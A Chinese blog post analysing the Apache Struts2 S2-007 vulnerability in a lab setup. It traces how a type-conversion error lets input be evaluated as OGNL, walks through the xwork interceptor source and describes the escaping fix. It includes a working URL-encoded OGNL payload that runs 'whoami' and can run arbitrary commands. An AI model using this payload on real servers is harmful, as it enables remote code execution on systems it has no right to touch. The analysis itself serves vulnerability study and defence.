---
title: 【Struts2-命令-代码执行漏洞分析系列】S2-007
date: 2018-08-31 19:13:04
tags:
	- java
	- struts2
	- 漏洞分析
---

# 前言

继上回S2-001之后，继续分析了S2-007，若有疏漏，还望多多指教。

漏洞环境根据vulhub中的环境修改而来 https://github.com/vulhub/vulhub/tree/master/struts2/s2-007

这回的S2-007和上回的S2-001漏洞环境地址 https://github.com/kingkaki/Struts2-Vulenv

有感兴趣的师傅可以一起分析下

# 漏洞信息

官方漏洞信息页面： https://cwiki.apache.org/confluence/display/WW/S2-007

![](Struts2-命令-代码执行漏洞分析系列 S2-007\1.png)

形成原因：
> User input is evaluated as an OGNL expression when there's a conversion error. This allows a malicious user to execute arbitrary code. 

当配置了验证规则，类型转换出错时，进行了错误的字符串拼接，进而造成了OGNL语句的执行。



# 漏洞利用

这里我配置了一个`UserAction-validation.xml`验证表单

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE validators PUBLIC
        "-//OpenSymphony Group//XWork Validator 1.0//EN"
        "http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
<validators>
    <field name="age">
        <field-validator type="int">
            <param name="min">1</param>
            <param name="max">150</param>
        </field-validator>
    </field>
</validators>
```

限制了age的值只能为`int`，而且长度在1-150之间

然后在登录界面用户名和邮箱值随意，age部分改为我们的payload

```
'+(#application)+'
```

![](Struts2-命令-代码执行漏洞分析系列 S2-007\2.png)

在age的value部分，成功有了回显

![](Struts2-命令-代码执行漏洞分析系列 S2-007\3.png)



命令执行

```
%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27
```

![](Struts2-命令-代码执行漏洞分析系列 S2-007\4.png)



修改`whoami`部分就可以执行任意命令

![](Struts2-命令-代码执行漏洞分析系列 S2-007\5.png)



# 漏洞分析

漏洞主要发生在`S2-007/web/WEB-INF/lib/xwork-core-2.2.3.jar!/com/opensymphony/xwork2/interceptor/ConversionErrorInterceptor.class:28`

```java
public String intercept(ActionInvocation invocation) throws Exception {
    ActionContext invocationContext = invocation.getInvocationContext();
    Map<String, Object> conversionErrors = invocationContext.getConversionErrors();
    ValueStack stack = invocationContext.getValueStack();
    HashMap<Object, Object> fakie = null;
    Iterator i$ = conversionErrors.entrySet().iterator();

    while(i$.hasNext()) {
        Entry<String, Object> entry = (Entry)i$.next();
        String propertyName = (String)entry.getKey();
        Object value = entry.getValue();
        if (this.shouldAddError(propertyName, value)) {
            String message = XWorkConverter.getConversionErrorMessage(propertyName, stack);
            Object action = invocation.getAction();
            if (action instanceof ValidationAware) {
                ValidationAware va = (ValidationAware)action;
                va.addFieldError(propertyName, message);
            }

            if (fakie == null) {
                fakie = new HashMap();
            }

            fakie.put(propertyName, this.getOverrideExpr(invocation, value));
        }
    }

    if (fakie != null) {
        stack.getContext().put("original.property.override", fakie);
        invocation.addPreResultListener(new PreResultListener() {
            public void beforeResult(ActionInvocation invocation, String resultCode) {
                Map<Object, Object> fakie = (Map)invocation.getInvocationContext().get("original.property.override");
                if (fakie != null) {
                    invocation.getStack().setExprOverrides(fakie);
                }

            }
        });
    }

    return invocation.invoke();
}
```

当类型出现错误的时候，就会进入这个函数

这里可以看到，在`Object value = entry.getValue();`中取出了传入的payload

![](Struts2-命令-代码执行漏洞分析系列 S2-007\6.png)

再来到后面的`fakie.put(propertyName, this.getOverrideExpr(invocation, value));`

跟进`this.getOverrideExpr(invocation, value);`

```java
protected Object getOverrideExpr(ActionInvocation invocation, Object value) {
    return "'" + value + "'";
}
```

这也就解释了为什么payload的两端要加`'+`、`+'`就是为了闭合这里的两端的引号

对放入`fakie`的value值就变成了`''+(#xxxx)+''`的形式

![](Struts2-命令-代码执行漏洞分析系列 S2-007\7.png)

进在后面放入了`invocation`值中，最后调用了`invoke()`解析OGNL成功代码执行

![](Struts2-命令-代码执行漏洞分析系列 S2-007\8.png)



# 漏洞修复

struts2.2.3.1对这个漏洞进行了修复，修复方法也异常简单，类似于sql注入的`addslashes`，对其中的单引号进行了转义

在`getOverrideExpr`函数中进行了`StringEscape`，从而无法闭合单引号，也就无法构造OGNL表达式

![](Struts2-命令-代码执行漏洞分析系列 S2-007\9.png)









# Reference Links

https://github.com/vulhub/vulhub/tree/master/struts2/s2-007

https://cwiki.apache.org/confluence/display/WW/S2-007

https://issues.apache.org/jira/browse/WW-3668